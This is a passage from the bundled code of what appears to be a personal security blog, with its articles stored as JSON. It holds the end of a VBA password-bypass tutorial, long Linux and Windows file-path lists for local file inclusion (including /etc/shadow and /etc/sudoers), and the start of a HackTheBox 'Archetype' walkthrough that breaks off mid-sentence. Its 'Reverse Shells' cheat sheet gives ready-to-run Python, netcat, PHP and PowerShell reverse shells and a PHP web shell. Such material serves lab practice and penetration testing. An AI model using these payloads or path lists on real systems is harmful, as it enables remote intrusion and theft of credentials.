src=\\"/cyber/blog/vbpasswordbypass/c893006ae98e43f4a07e554a972f4d2f.png\\"></p>","<p>This is the portion of code where it says which password is set, which in this case is &quot;jafor&quot;. Our goal is to replace this portion in the target file so that the password set is &quot;jafor&quot; and no longer &quot;test&quot;.</p>"]},{"id":"Replace password in the target file","title":"<h3>Replace password in the target file</h3>","body":["<p>We also perform the same steps on the target file to open the binary file with our hex editor and paste the dummy\'s code in the target file and save it.</p>","<p><img src=\\"/cyber/blog/vbpasswordbypass/7e876409db514302bd184792b83f7d46.png\\"></p>","<p>After changing the target file\'s code with our dummy\'s code:</p>","<img src=\\"/cyber/blog/vbpasswordbypass/a6195e41074b484da3625961a1b1e8d7.png\\"></p>","<p>Replace the modified binary with the original one inside the zip folder and change the format back from <em>.zip</em> to <em>.xlsm</em>. Now we can access the source code with the password &quot;jafor&quot; instead of &quot;test&quot;.</p>","<p><img src=\\"/cyber/blog/vbpasswordbypass/a433c13f02d6453ab41d6a49f87d78d1.png\\"></p>"]}]}]}]}')},8461:e=>{"use strict";e.exports=JSON.parse('{"files":["cheatsheetdb/reverse-shells.json","cheatsheetdb/windows-config-files.json","cheatsheetdb/linux-config-files.json"]}')},4176:e=>{"use strict";e.exports=JSON.parse('{"title":"Linux Config Files","path":"linux-config-files","tags":["linux"],"date":"APR 2025","location":"./cheatsheetdb/","banner":"cheatsheet/linuxconfigfile/banner.gif","type":"cheat-sheet","search":[{"section":"","description":""}],"body":[{"id":"Configuration Files","title":"<h1> <span style=\\"color:#da1953\\">Con</span>figuration Files</h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/cheatsheet/linuxconfigfile/banner.gif\\" alt=\\"\\">"]},{"id":"Linux paths","title":"<hr><h1><span style=\\"color:#da1953\\">Lin</span>ux paths</h1>","body":["<p>/apache/conf/httpd.conf<br>/apache/logs/access.log<br>/apache/logs/error.log<br>/apache/php/php.ini<br>/apache2/logs/access.log<br>/apache2/logs/error.log<br>/bin/php.ini<br>/etc/adduser.conf<br>/etc/alias<br>/etc/apache/access.conf<br>/etc/apache/apache.conf<br>/etc/apache/conf/httpd.conf<br>/etc/apache/default-server.conf<br>/etc/apache/httpd.conf<br>/etc/apache2/apache.conf<br>/etc/apache2/apache2.conf<br>/etc/apache2/conf.d/charset<br>/etc/apache2/conf.d/phpmyadmin.conf<br>/etc/apache2/conf.d/security<br>/etc/apache2/conf/httpd.conf<br>/etc/apache2/default-server.conf<br>/etc/apache2/envvars<br>/etc/apache2/httpd.conf<br>/etc/apache2/httpd2.conf<br>/etc/apache2/mods-available/autoindex.conf<br>/etc/apache2/mods-available/deflate.conf<br>/etc/apache2/mods-available/dir.conf<br>/etc/apache2/mods-available/mem_cache.conf<br>/etc/apache2/mods-available/mime.conf<br>/etc/apache2/mods-available/proxy.conf<br>/etc/apache2/mods-available/setenvif.conf<br>/etc/apache2/mods-available/ssl.conf<br>/etc/apache2/mods-enabled/alias.conf<br>/etc/apache2/mods-enabled/deflate.conf<br>/etc/apache2/mods-enabled/dir.conf<br>/etc/apache2/mods-enabled/mime.conf<br>/etc/apache2/mods-enabled/negotiation.conf<br>/etc/apache2/mods-enabled/php5.conf<br>/etc/apache2/mods-enabled/status.conf<br>/etc/apache2/ports.conf<br>/etc/apache2/sites-available/default<br>/etc/apache2/sites-available/default-ssl<br>/etc/apache2/sites-enabled/000-default<br>/etc/apache2/sites-enabled/default<br>/etc/apache2/ssl-global.conf<br>/etc/apache2/vhosts.d/00_default_vhost.conf<br>/etc/apache2/vhosts.d/default_vhost.include<br>/etc/apache22/conf/httpd.conf<br>/etc/apache22/httpd.conf<br>/etc/apt/apt.conf<br>/etc/avahi/avahi-daemon.conf<br>/etc/bash.bashrc<br>/etc/bash_completion.d/debconf<br>/etc/bluetooth/input.conf<br>/etc/bluetooth/main.conf<br>/etc/bluetooth/network.conf<br>/etc/bluetooth/rfcomm.conf<br>/etc/ca-certificates.conf<br>/etc/ca-certificates.conf.dpkg-old<br>/etc/casper.conf<br>/etc/chkrootkit.conf<br>/etc/chrootUsers<br>/etc/clamav/clamd.conf<br>/etc/clamav/freshclam.conf<br>/etc/crontab<br>/etc/crypttab<br>/etc/cups/acroread.conf<br>/etc/cups/cupsd.conf<br>/etc/cups/cupsd.conf.default<br>/etc/cups/pdftops.conf<br>/etc/cups/printers.conf<br>/etc/cvs-cron.conf<br>/etc/cvs-pserver.conf<br>/etc/debconf.conf<br>/etc/debian_version<br>/etc/default/grub<br>/etc/deluser.conf<br>/etc/dhcp/dhclient.conf<br>/etc/dhcp3/dhclient.conf<br>/etc/dhcp3/dhcpd.conf<br>/etc/dns2tcpd.conf<br>/etc/e2fsck.conf<br>/etc/esound/esd.conf<br>/etc/etter.conf<br>/etc/exports<br>/etc/fedora-release<br>/etc/firewall.rules<br>/etc/foremost.conf<br>/etc/fstab<br>/etc/ftpchroot<br>/etc/ftphosts<br>/etc/ftpusers<br>/etc/fuse.conf<br>/etc/group<br>/etc/group-<br>/etc/hdparm.conf<br>/etc/host.conf<br>/etc/hostname<br>/etc/hosts<br>/etc/hosts.allow<br>/etc/hosts.deny<br>/etc/http/conf/httpd.conf<br>/etc/http/httpd.conf<br>/etc/httpd.conf<br>/etc/httpd/apache.conf<br>/etc/httpd/apache2.conf<br>/etc/httpd/conf<br>/etc/httpd/conf.d<br>/etc/httpd/conf.d/php.conf<br>/etc/httpd/conf.d/squirrelmail.conf<br>/etc/httpd/conf/apache.conf<br>/etc/httpd/conf/apache2.conf<br>/etc/httpd/conf/httpd.conf<br>/etc/httpd/extra/httpd-ssl.conf<br>/etc/httpd/httpd.conf<br>/etc/httpd/logs/access.log<br>/etc/httpd/logs/access_log<br>/etc/httpd/logs/error.log<br>/etc/httpd/logs/error_log<br>/etc/httpd/mod_php.conf<br>/etc/httpd/php.ini<br>/etc/inetd.conf<br>/etc/init.d<br>/etc/inittab<br>/etc/ipfw.conf<br>/etc/ipfw.rules<br>/etc/issue<br>/etc/issue.net<br>/etc/kbd/config<br>/etc/kernel-img.conf<br>/etc/kernel-pkg.conf<br>/etc/ld.so.conf<br>/etc/ldap/ldap.conf<br>/etc/lighttpd/lighthttpd.conf<br>/etc/login.defs<br>/etc/logrotate.conf<br>/etc/logrotate.d/ftp<br>/etc/logrotate.d/proftpd<br>/etc/logrotate.d/vsftpd.log<br>/etc/ltrace.conf<br>/etc/mail/sendmail.conf<br>/etc/mandrake-release<br>/etc/manpath.config<br>/etc/miredo.conf<br>/etc/miredo/miredo.conf<br>/etc/miredo/miredo-server.conf<br>/etc/miredo-server.conf<br>/etc/modprobe.d/vmware-tools.conf<br>/etc/modules<br>/etc/mono/1.0/machine.config<br>/etc/mono/2.0/machine.config<br>/etc/mono/2.0/web.config<br>/etc/mono/config<br>/etc/motd<br>/etc/mtab<br>/etc/mtools.conf<br>/etc/muddleftpd.com<br>/etc/muddleftpd/muddleftpd.conf<br>/etc/muddleftpd/muddleftpd.passwd<br>/etc/muddleftpd/mudlog<br>/etc/muddleftpd/mudlogd.conf<br>/etc/muddleftpd/passwd<br>/etc/my.cnf<br>/etc/mysql/conf.d/old_passwords.cnf<br>/etc/mysql/my.cnf<br>/etc/networks<br>/etc/newsyslog.conf<br>/etc/nginx/nginx.conf<br>/etc/openldap/ldap.conf<br>/etc/os-release<br>/etc/osxhttpd/osxhttpd.conf<br>/etc/pam.conf<br>/etc/pam.d/proftpd<br>/etc/passwd<br>/etc/passwd-<br>/etc/passwd~<br>/etc/password.master<br>/etc/php.ini<br>/etc/php/apache/php.ini<br>/etc/php/apache2/php.ini<br>/etc/php/cgi/php.ini<br>/etc/php/php.ini<br>/etc/php/php4/php.ini<br>/etc/php4.4/fcgi/php.ini<br>/etc/php4/apache/php.ini<br>/etc/php4/apache2/php.ini<br>/etc/php4/cgi/php.ini<br>/etc/php5/apache/php.ini<br>/etc/php5/apache2/php.ini<br>/etc/php5/cgi/php.ini<br>/etc/phpmyadmin/config.inc.php<br>/etc/postgresql/pg_hba.conf<br>/etc/postgresql/postgresql.conf<br>/etc/profile<br>/etc/proftp.conf<br>/etc/proftpd/modules.conf<br>/etc/protpd/proftpd.conf<br>/etc/pulse/client.conf<br>/etc/pure-ftpd.conf<br>/etc/pureftpd.passwd<br>/etc/pureftpd.pdb<br>/etc/pure-ftpd/pure-ftpd.conf<br>/etc/pure-ftpd/pureftpd.pdb<br>/etc/pure-ftpd/pure-ftpd.pdb<br>/etc/rc.conf<br>/etc/rc.d/rc.httpd<br>/etc/redhat-release<br>/etc/resolv.conf<br>/etc/resolvconf/update-libc.d/sendmail<br>/etc/samba/dhcp.conf<br>/etc/samba/netlogon<br>/etc/samba/private/smbpasswd<br>/etc/samba/samba.conf<br>/etc/samba/smb.conf<br>/etc/samba/smb.conf.user<br>/etc/samba/smbpasswd<br>/etc/samba/smbusers<br>/etc/security/access.conf<br>/etc/security/environ<br>/etc/security/failedlogin<br>/etc/security/group<br>/etc/security/group.conf<br>/etc/security/lastlog<br>/etc/security/limits<br>/etc/security/limits.conf<br>/etc/security/namespace.conf<br>/etc/security/opasswd<br>/etc/security/pam_env.conf<br>/etc/security/passwd<br>/etc/security/sepermit.conf<br>/etc/security/time.conf<br>/etc/security/user<br>/etc/sensors.conf<br>/etc/sensors3.conf<br>/etc/shadow<br>/etc/shadow-<br>/etc/shadow~<br>/etc/slackware-release<br>/etc/smb.conf<br>/etc/smbpasswd<br>/etc/smi.conf<br>/etc/squirrelmail/apache.conf<br>/etc/squirrelmail/config.php<br>/etc/squirrelmail/config/config.php<br>/etc/squirrelmail/config_default.php<br>/etc/squirrelmail/config_local.php<br>/etc/squirrelmail/default_pref<br>/etc/squirrelmail/filters_setup.php<br>/etc/squirrelmail/index.php<br>/etc/squirrelmail/sqspell_config.php<br>/etc/ssh/sshd_config<br>/etc/sso/sso_config.ini<br>/etc/stunnel/stunnel.conf<br>/etc/subversion/config<br>/etc/sudoers<br>/etc/SUSE-release<br>/etc/sw-cp-server/applications.d/00-sso-cpserver.conf<br>/etc/sw-cp-server/applications.d/plesk.conf<br>/etc/sysconfig/network-scripts/ifcfg-eth0<br>/etc/sysctl.conf<br>/etc/sysctl.d/10-console-messages.conf<br>/etc/sysctl.d/10-network-security.conf<br>/etc/sysctl.d/10-process-security.conf<br>/etc/sysctl.d/wine.sysctl.conf<br>/etc/syslog.conf<br>/etc/timezone<br>/etc/tinyproxy/tinyproxy.conf<br>/etc/tor/tor-tsocks.conf<br>/etc/tsocks.conf<br>/etc/updatedb.conf<br>/etc/updatedb.conf.BeforeVMwareToolsInstall<br>/etc/utmp<br>/etc/vhcs2/proftpd/proftpd.conf<br>/etc/vmware-tools/config<br>/etc/vmware-tools/tpvmlp.conf<br>/etc/vmware-tools/vmware-tools-libraries.conf<br>/etc/vsftpd.chroot_list<br>/etc/vsftpd.conf<br>/etc/vsftpd/vsftpd.conf<br>/etc/webmin/miniserv.conf<br>/etc/webmin/miniserv.users<br>/etc/wicd/dhclient.conf.template.default<br>/etc/wicd/manager-settings.conf<br>/etc/wicd/wired-settings.conf<br>/etc/wicd/wireless-settings.conf<br>/etc/wu-ftpd/ftpaccess<br>/etc/wu-ftpd/ftphosts<br>/etc/wu-ftpd/ftpusers</p>"]}]}]}')},6823:e=>{"use strict";e.exports=JSON.parse('{"title":"Reverse Shells","path":"reverse-shells","tags":["pyhton"],"date":"APR 2025","location":"./cheatsheetdb/","banner":"cheatsheet/reverseshell/banner.png","type":"cheat-sheet","search":[{"section":"","description":""}],"body":[{"id":"Reverse Shells","title":"<h1> <span style=\\"color:#da1953\\">Rev</span>erse Shells</h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/cheatsheet/reverseshell/banner.png\\" alt=\\"\\">"]},{"id":"Python","title":"<hr><h1><span style=\\"color:#da1953\\">Pyt</span>hon</h1>","body":["python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"10.0.0.1\\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\"/bin/sh\\",\\"-i\\"]);\'"]},{"id":"NetCat","title":"<h1><span style=\\"color:#da1953\\">Net</span>Cat</h1>","body":["rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"]},{"id":"PHP","title":"<h1><span style=\\"color:#da1953\\">PHP</span></h1>","body":["&lt;?php system($_GET[\'cmd\']);?&gt;","php -r \'$sock=fsockopen(\\"10.10.17.1\\",1337);exec(\\"/bin/sh -i &lt;&3 &gt;&3 2&gt;&3\\");\'"]},{"id":"PowerShell","title":"<h1><span style=\\"color:#da1953\\">Pow</span>erShell</h1>","body":["$client = New-Object System.Net.Sockets.TCPClient(\\"10.10.14.84\\", 4444);\\n$stream = $client.GetStream();\\n[byte[]]$bytes = 0..65535 | %{0};\\nwhile(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {\\n    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);\\n    $sendback = (iex $data 2>&1 | Out-String);\\n    $sendback2 = $sendback + \\"# \\";\\n    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\\n    $stream.Write($sendbyte, 0, $sendbyte.Length);\\n$stream.Flu$client = New-Object System.Net.Sockets.TCPClient(\\"10.10.14.84\\", 4444);\\n$stream = $client.GetStream();\\n[byte[]]$bytes = 0..65535 | %{0};\\nwhile(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {\\n    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);\\n    $sendback = (iex $data 2>&1 | Out-String);\\n    $sendback2 = $sendback + \\"# \\";\\n    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);\\n    $stream.Write($sendbyte, 0, $sendbyte.Length);\\n    $stream.Flush();\\n}\\n$client.Close();"]}]}]}')},4850:e=>{"use strict";e.exports=JSON.parse('{"title":"Windows Config Files","path":"windows-config-files","tags":["windows"],"date":"APR 2025","location":"./cheatsheetdb/","banner":"cheatsheet/windowsconfigfile/banner.gif","type":"cheat-sheet","search":[{"section":"","description":"https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows"}],"body":[{"id":"Configuration Files","title":"<h1> <span style=\\"color:#da1953\\">Con</span>figuration Files</h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/cheatsheet/windowsconfigfile/banner.gif\\" alt=\\"\\">"]},{"id":"Windows paths","title":"<hr><h1><span style=\\"color:#da1953\\">Win</span>dows paths</h1>","body":["<p>c:/php5/php.ini<br>c:/php4/php.ini<br>c:/php/php.ini<br>c:/PHP/php.ini<br>c:/WINDOWS/php.ini<br>c:/WINNT/php.ini<br>c:/apache/php/php.ini<br>c:/xampp/apache/bin/php.ini<br>c:/NetServer/bin/stable/apache/php.ini<br>c:/Program Files/MySQL/MySQL Server 5.0/data/{IPDELHOST}.err<br>c:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log<br>c:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err<br>c:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log<br>c:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.index<br>c:/Program Files/MySQL/data/{IPDELHOST}.err<br>c:/Program Files/MySQL/data/mysql.log<br>c:/Program Files/MySQL/data/mysql.err<br>c:/Program Files/MySQL/data/mysql-bin.log<br>c:/Program Files/MySQL/data/mysql-bin.index<br>c:/MySQL/data/{IPDELHOST}.err<br>c:/MySQL/data/mysql.log<br>c:/MySQL/data/mysql.err<br>c:/MySQL/data/mysql-bin.log<br>c:/MySQL/data/mysql-bin.index<br>c:/Program Files/MySQL/MySQL Server 5.0/my.ini<br>c:/Program Files/MySQL/MySQL Server 5.0/my.cnf<br>c:/Program Files/MySQL/my.ini<br>c:/Program Files/MySQL/my.cnf<br>c:/MySQL/my.ini<br>c:/MySQL/my.cnf<br>c:/mysql/bin/my.ini<br>c:/PostgreSQL/log/pgadmin.log<br>c:/var/lib/pgsql/data/postgresql.conf<br>c:/var/postgresql/db/postgresql.conf<br>c:/var/nm2/postgresql.conf<br>c:/usr/local/pgsql/data/postgresql.conf<br>c:/usr/local/pgsql/data/pg_hba.conf<br>c:/usr/internet/pgsql/data/pg_hba.conf<br>c:/usr/local/pgsql/data/passwd<br>c:/usr/local/pgsql/bin/pg_passwd<br>c:/etc/postgresql/postgresql.conf<br>c:/etc/postgresql/pg_hba.conf<br>c:/home/postgres/data/postgresql.conf<br>c:/home/postgres/data/PG_VERSION<br>c:/home/postgres/data/pg_ident.conf<br>c:/home/postgres/data/pg_hba.conf<br>c:/Program Files/PostgreSQL/8.3/data/pg_hba.conf<br>c:/Program Files/PostgreSQL/8.3/data/pg_ident.conf<br>c:/Program Files/PostgreSQL/8.3/data/postgresql.conf<br>c:/Program Files/PostgreSQL/8.4/data/pg_hba.conf<br>c:/Program Files/PostgreSQL/8.4/data/pg_ident.conf<br>c:/Program Files/PostgreSQL/8.4/data/postgresql.conf<br>c:/Program Files/PostgreSQL/9.0/data/pg_hba.conf<br>c:/Program Files/PostgreSQL/9.0/data/pg_ident.conf<br>c:/Program Files/PostgreSQL/9.0/data/postgresql.conf<br>c:/Program Files/PostgreSQL/9.1/data/pg_hba.conf<br>c:/Program Files/PostgreSQL/9.1/data/pg_ident.conf<br>c:/Program Files/PostgreSQL/9.1/data/postgresql.conf<br>c:/wamp/logs/access.log<br>c:/wamp/logs/apache_error.log<br>c:/wamp/logs/genquery.log<br>c:/wamp/logs/mysql.log<br>c:/wamp/logs/slowquery.log<br>c:/wamp/bin/apache/apache2.2.22/logs/access.log<br>c:/wamp/bin/apache/apache2.2.22/logs/error.log<br>c:/wamp/bin/apache/apache2.2.21/logs/access.log<br>c:/wamp/bin/apache/apache2.2.21/logs/error.log<br>c:/wamp/bin/mysql/mysql5.5.24/data/mysql-bin.index<br>c:/wamp/bin/mysql/mysql5.5.16/data/mysql-bin.index<br>c:/wamp/bin/apache/apache2.2.21/conf/httpd.conf<br>c:/wamp/bin/apache/apache2.2.22/conf/httpd.conf<br>c:/wamp/bin/apache/apache2.2.21/wampserver.conf<br>c:/wamp/bin/apache/apache2.2.22/wampserver.conf<br>c:/wamp/bin/apache/apache2.2.22/conf/wampserver.conf<br>c:/wamp/bin/mysql/mysql5.5.24/my.ini<br>c:/wamp/bin/mysql/mysql5.5.24/wampserver.conf<br>c:/wamp/bin/mysql/mysql5.5.16/my.ini<br>c:/wamp/bin/mysql/mysql5.5.16/wampserver.conf<br>c:/wamp/bin/php/php5.3.8/php.ini<br>c:/wamp/bin/php/php5.4.3/php.ini<br>c:/xampp/apache/logs/access.log<br>c:/xampp/apache/logs/error.log<br>c:/xampp/mysql/data/mysql-bin.index<br>c:/xampp/mysql/data/mysql.err<br>c:/xampp/mysql/data/{IPDELHOST}.err<br>c:/xampp/sendmail/sendmail.log<br>c:/xampp/apache/conf/httpd.conf<br>c:/xampp/FileZillaFTP/FileZilla Server.xml<br>c:/xampp/MercuryMail/mercury.ini<br>c:/xampp/php/php.ini<br>c:/xampp/phpMyAdmin/config.inc.php<br>c:/xampp/sendmail/sendmail.ini<br>c:/xampp/webalizer/webalizer.conf<br>c:/xampp/htdocs/aca.txt<br>c:/xampp/htdocs/admin.php<br>c:/xampp/htdocs/leer.txt<br>c:/WINNT/system32/logfiles/MSFTPSVC<br>c:/WINNT/system32/logfiles/MSFTPSVC1<br>c:/WINNT/system32/logfiles/MSFTPSVC2<br>c:/WINDOWS/system32/logfiles/MSFTPSVC<br>c:/WINDOWS/system32/logfiles/MSFTPSVC1<br>c:/WINDOWS/system32/logfiles/MSFTPSVC2<br>c:/WINNT/system32/logfiles/SMTPSVC<br>c:/WINNT/system32/logfiles/SMTPSVC1<br>c:/WINNT/system32/logfiles/SMTPSVC2<br>c:/WINNT/system32/logfiles/SMTPSVC3<br>c:/WINNT/system32/logfiles/SMTPSVC4<br>c:/WINNT/system32/logfiles/SMTPSVC5<br>c:/WINDOWS/system32/logfiles/SMTPSVC<br>c:/WINDOWS/system32/logfiles/SMTPSVC1<br>c:/WINDOWS/system32/logfiles/SMTPSVC2<br>c:/WINDOWS/system32/logfiles/SMTPSVC3<br>c:/WINDOWS/system32/logfiles/SMTPSVC4<br>c:/WINDOWS/system32/logfiles/SMTPSVC5<br>c:/WINNT/system32/logfiles/W3SVC/inetsvn1.log<br>c:/WINNT/system32/logfiles/W3SVC1/inetsvn1.log<br>c:/WINNT/system32/logfiles/W3SVC2/inetsvn1.log<br>c:/WINNT/system32/logfiles/W3SVC3/inetsvn1.log<br>c:/WINDOWS/system32/logfiles/W3SVC/inetsvn1.log<br>c:/WINDOWS/system32/logfiles/W3SVC1/inetsvn1.log<br>c:/WINDOWS/system32/logfiles/W3SVC2/inetsvn1.log<br>c:/WINDOWS/system32/logfiles/W3SVC3/inetsvn1.log<br>c:/Program Files/Apache Group/Apache/logs/access.log<br>c:/Program Files/Apache Group/Apache/logs/error.log<br>c:/Program Files/Apache Software Foundation/Apache2.2/logs/error.log<br>c:/Program Files/Apache Software Foundation/Apache2.2/logs/access.log<br>c:/Program Files/Apache Group/Apache/conf/httpd.conf<br>c:/Program Files/Apache Group/Apache2/conf/httpd.conf<br>c:/Program Files/xampp/apache/conf/apache.conf<br>c:/Program Files/xampp/apache/conf/apache2.conf<br>c:/Program Files/xampp/apache/conf/httpd.conf<br>c:/Program Files/Apache Group/Apache/apache.conf<br>c:/Program Files/Apache Group/Apache/conf/apache.conf<br>c:/Program Files/Apache Group/Apache2/conf/apache.conf<br>c:/Program Files/Apache Group/Apache/apache2.conf<br>c:/Program Files/Apache Group/Apache/conf/apache2.conf<br>c:/Program Files/Apache Group/Apache2/conf/apache2.conf<br>c:/Program Files/Apache Software Foundation/Apache2.2/conf/httpd.conf<br>c:/var/log/lighttpd/{DOMAIN}/access.log<br>c:/Program Files/Vidalia Bundle/Polipo/polipo.conf<br>c:/WINNT/system32/logfiles/Firewall/pfirewall.log<br>c:/WINNT/system32/logfiles/Firewall/pfirewall.log.old<br>c:/WINDOWS/system32/logfiles/Firewall/pfirewall.log<br>c:/WINDOWS/system32/logfiles/Firewall/pfirewall.log.old<br>c:/WINDOWS/system32/drivers/etc/hosts<br>c:/WINDOWS/system32/drivers/etc/lmhosts.sam<br>c:/WINDOWS/system32/drivers/etc/networks<br>c:/WINDOWS/system32/drivers/etc/protocol<br>c:/WINDOWS/system32/drivers/etc/services<br>c:/boot.ini<br>c:/WINDOWS/Debug/NetSetup.LOG<br>c:/WINDOWS/comsetup.log<br>c:/WINDOWS/repair/setup.log<br>c:/WINDOWS/setupact.log<br>c:/WINDOWS/setupapi.log<br>c:/WINDOWS/setuperr.log<br>c:/WINDOWS/updspapi.log<br>c:/WINDOWS/wmsetup.log<br>c:/WINDOWS/WindowsUpdate.log<br>c:/WINDOWS/ODBC.INI<br>c:/WINDOWS/system32/Macromed/Flash/FlashInstall.log<br>c:/WINDOWS/system32/Macromed/Flash/install.log</p>"]}]}]}')},2128:e=>{"use strict";e.exports=JSON.parse('{"note":"title must match route name in App.js","title":"Archetype","path":"archetype","tags":["easy","ctf","box","htb","smb","sql","powershell","iex","python webserver","curl","download file","powershell iex","windows","privesc","smbclient","crackmapexec","rce"],"date":"AUG 2024","location":"./writeup/","banner":"writeup/archetype/banner.gif","type":"writeup","search":[{"section":"","description":"Scanning with Nmap, discovering ports 135 msrpc, 139 netbios-ssn, 445 microsoft-ds and 1433 ms-sql-s"},{"section":"Listing shares","description":"Listing SMB shares with smbclient"},{"section":"Access share","description":"Access SMB share with smbclient"},{"section":"Download file","description":"Downloading files from SMB share"},{"section":"Access SQL","description":"Accessing SQL with Impacket script mssqlclient"},{"section":"Remote Code Execution","description":"Remote code execution (RCE) from SQL command line"},{"section":"Reverse shell","description":"Downloading and executing a reverse shell with Powershell IEX"},{"section":"Reverse shell","description":"Employed python web server to download file with powershell command in Windows environment."}],"body":[{"id":"Archetype","title":"<h1> <span style=\\"color:#da1953\\">Arc</span>hetype</h1><hr>","body":[{"id":"banner","title":"","body":["<img src=\\"/cyber/writeup/archetype/banner.gif\\" alt=\\"\\">"]},{"id":"Scanning","title":"<hr><h1><span style=\\"color:#da1953\\">Sca</span>nning</h1>","body":["<br><pre># Nmap 7.80 scan initiated Fri Jun 18 02:52:56 2021 as: nmap -sC -sV -oA nmap/nmap 10.10.10.27<br>Nmap scan report for 10.10.10.27<br>Host is up (0.048s latency).<br>Not shown: 996 closed ports<br>PORT     STATE SERVICE      VERSION<br>135/tcp  open  msrpc        Microsoft Windows RPC<br>139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn<br>445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds<br>1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM<br>| ms-sql-ntlm-info: <br>|   Target_Name: ARCHETYPE<br>|   NetBIOS_Domain_Name: ARCHETYPE<br>|   NetBIOS_Computer_Name: ARCHETYPE<br>|   DNS_Domain_Name: Archetype<br>|   DNS_Computer_Name: Archetype<br>|_  Product_Version: 10.0.17763<br>| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback<br>| Not valid before: 2021-06-18T07:06:04<br>|_Not valid after:  2051-06-18T07:06:04<br>|_ssl-date: 2021-06-18T07:11:38+00:00; +18m24s from scanner time.<br>Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>|_clock-skew: mean: 1h42m23s, deviation: 3h07m50s, median: 18m23s<br>| ms-sql-info: <br>|   10.10.10.27:1433: <br>|     Version: <br>|       name: Microsoft SQL Server 2017 RTM<br>|       number: 14.00.1000.00<br>|       Product: Microsoft SQL Server 2017<br>|       Service pack level: RTM<br>|       Post-SP patches applied: false<br>|_    TCP port: 1433<br>| smb-os-discovery: <br>|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)<br>|   Computer name: Archetype<br>|   NetBIOS computer name: ARCHETYPE\\\\x00<br>|   Workgroup: WORKGROUP\\\\x00                                                                                        <br>|_  System time: 2021-06-18T00:11:29-07:00                                  <br>| smb-security-mode:                          <br>|   account_used: guest                                                                                             <br>|   authentication_level: user                                                                                      <br>|   challenge_response: supported                                                                                   <br>|_  message_signing: disabled (dangerous, but default)                                                              <br>| smb2-security-mode:                                                                                               <br>|   2.02:                                                                                                           <br>|_    Message signing enabled but not required<br>| smb2-time: <br>|   date: 2021-06-18T07:11:30<br>|_  start_date: N/A<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br># Nmap done at Fri Jun 18 02:53:14 2021 -- 1 IP address (1 host up) scanned in 18.46 seconds<br></pre><br>"]},{"id":"Listing shares","title":"<h1><span style=\\"color:#da1953\\">Lis</span>ting shares</h1>","body":["<p>There are various ways to list the shares that I have seen in the various IppSec videos but in this specific case, the following command is the only one that worked.</p>","<p><pre>$ smbclient -N -L \\\\\\\\10.10.10.27<br><br>        Sharename       Type      Comment<br>        ---------       ----      -------<br>        ADMIN$          Disk      Remote Admin<br>        backups         Disk      <br>        C$              Disk      Default share<br>        IPC$            IPC       Remote IPC<br>SMB1 disabled -- no workgroup available<br></pre></p>","<p><i>smbclient<i> doesn\'t tell if a share is read-only or read/write. To get that information I use <i>crackmapexec<i>.</p>","<p><pre>$ crackmapexec smb 10.10.10.27 --shares -u \'benwick\' -p \'\'<br>SMB         10.10.10.27     445    ARCHETYPE        [*] Windows Server 2019 Standard 17763 (name:ARCHETYPE) (domain:Archetype) (signing:False) (SMBv1:True)<br>SMB         10.10.10.27     445    ARCHETYPE        [+] Archetype\\\\benwick: <br>SMB         10.10.10.27     445    ARCHETYPE        [+] Enumerated shares<br>SMB         10.10.10.27     445    ARCHETYPE        Share           Permissions     Remark<br>SMB         10.10.10.27     445    ARCHETYPE        -----           -----------     ------<br>SMB         10.10.10.27     445    ARCHETYPE        ADMIN$                          Remote Admin<br>SMB         10.10.10.27     445    ARCHETYPE        backups         READ            <br>SMB         10.10.10.27     445    ARCHETYPE        C$                              Default share<br>SMB         10.10.10.27     445    ARCHETYPE        IPC$                            Remote IPC<br></pre></p>","<p>With <i>crackmapexec</i> I have to specify a user and at least a blank password otherwise with the blank user for NULL authentication it doesn\'t work.</p>"]},{"id":"Access share","title":"<h1><span style=\\"color:#da1953\\">Acc</span>ess share</h1>","body":["<p>From the previous step, the only share accessible for reading is <b>backups<b>.</p>","<p><pre>$ smbclient \'\\\\10.10.10.27\\\\backups\'<br>Enter WORKGROUP\\\\kali\'s password: <br>Try \\"help\\" to get a list of possible commands.<br>smb: \\\\> ls<br>  .                                   D        0  Mon Jan 20 07:20:57 2020<br>  ..                                  D        0  Mon Jan 20 07:20:57 2020<br>  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020<br><br>                10328063 blocks of size 4096. 8258523 blocks available<br></pre></p>","<p>By listing the current directory you will find a configuration file.</p>"]},{"id":"Download file","title":"<h1><span style=\\"color:#da1953\\">Dow</span>nload file</h1>","body":["<p>Since I couldn\'t read the configuration file I downloaded it to my host with the <code>get [remote-file-name] [local-file-name]</code> command.</p>","<p><pre>smb: \\\\> get prod.dtsConfig conf<br>getting file \\\\prod.dtsConfig of size 609 as conf (3.2 KiloBytes/sec) (average 3.2 KiloBytes/sec)<br></pre></p>"]},{"id":"Credentials","title":"<h1><span style=\\"color:#da1953\\">Cre</span>dentials</h1>","body":["<p>Once the configuration file is open, I can see the credentials in it: <i>ARCHETYPE\\\\sql_svc:M3g4c0rp123</i>Since SQL appears on the user sunday most likely he is part of SQL account. In fact, from the 